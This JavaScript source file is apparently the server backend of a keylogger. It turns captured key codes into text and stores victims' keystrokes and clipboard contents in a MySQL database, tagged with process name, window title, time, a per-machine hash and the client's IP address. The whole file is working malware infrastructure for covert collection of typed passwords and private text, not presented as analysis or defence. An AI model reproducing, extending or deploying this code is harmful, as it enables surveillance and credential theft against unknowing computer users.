const mysql = require('mysql');
const keyTable = require('./keycodes.json');

// Connect to database
var db = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : '',
  database : 'lrc'
});
db.connect();

function resolveKeyCodes(keyCodes) {
    var text = '';

    for (var i = 0; i < keyCodes.length; i++) {

        var key = keyCodes[i];
        var keyCase = (key.flags == 0x0 || key.flags == 0x3) ? "lower" : "upper";

        if (keyTable['default']['both'][key.keyCode] != undefined) {
            text += keyTable['default']['both'][key.keyCode];
            continue;
        }
        
        if (keyTable['default'][keyCase] != undefined) {

            if (keyTable['default'][keyCase][key.keyCode] != undefined) {
                text += keyTable['default'][keyCase][key.keyCode];
                continue;
            }
        }
        
        if (keyTable[key.lang] != undefined) {
            if (keyTable[key.lang][keyCase] != undefined) {
                if (keyTable[key.lang][keyCase][key.keyCode] != undefined) {
                    text += keyTable[key.lang][keyCase][key.keyCode];
                    continue;
                }
            }
        }
    }

    return text;
}

function saveKeyboard(user_id, data) {
    for (var i = 0; i < data.length; i++) {

        var process	= data[i].wndInfo.process;
        var title	= data[i].wndInfo.title;
        var text    = resolveKeyCodes(data[i].keys).trim();
        var time	= data[i].wndInfo.time;

        if (text.length == 0) {
            text = null;
        }

        var query = 'INSERT INTO keyboard (user_id, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
        var values = [user_id, process, title, text, time];

        db.query(query, values, function(err, rows, fields) {
            if (err) {
                console.log(err);
            }
        });
    }
}

function saveClipboard(user_id, data) {
    for (var i = 0; i < data.length; i++) {

        var process	= data[i].wndInfo.process;
        var title	= data[i].wndInfo.title;
        var text    = data[i].data;
        var time	= data[i].wndInfo.time;

        if (text == '') {
            continue;
        }

        var query = 'INSERT INTO clipboard (user_id, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
        var values = [user_id, process, title, text, time];

        db.query(query, values, function(err, rows, fields) {
            if (err) {
                console.log(err);
            }
        });
    }
}

function saveData(user_id, data) {
    switch (data.type) {
        // Keyboard
        case 1:
        saveKeyboard(user_id, data.data.items);
        break;
        // Clipboard
        case 2:
        saveClipboard(user_id, data.data.items);
        break;
    }
}

function validateSHA256(sha256) {
    if (sha256.length != 64) {
        return false;
    }

    for (var i = 0; i < sha256.length; i++) {
        var code = sha256.charCodeAt(i);
        if (code < 48 || code > 102) {
            return false;
        }
    }

    return true;
}

// Add user to database. Returns user id.
function addUser(ws, sha256, callback) {
    var query = 'INSERT INTO users (sha256, ip) VALUES (?, ?)';
    var values = [sha256, ws._socket.remoteAddress];

    db.query(query, values, function(err, rows, fields) {
        if (err) {
            callback(-1);
        } else {
            callback(rows.insertId, sha256);
        }
    });
}

// Returns user ID by sha256
function getUserID(ws, sha256, callback) {
    var uidIsOk = validateSHA256(sha256);
    if (!uidIsOk) {
        callback(-1);
    }

    // Find user with given UID
    db.query('SELECT * FROM users WHERE sha256 = ?', [sha256], function(err, rows, fields) {
        if (err) {
            callback(-1);
        } else {
            if (rows.length == 0) {
                addUser(ws, sha256, callback);
            } else {
                callback(rows[0].id, sha256);
            }
        }
    });
}

module.exports.saveData = saveData;
module.exports.getUserID = getUserID;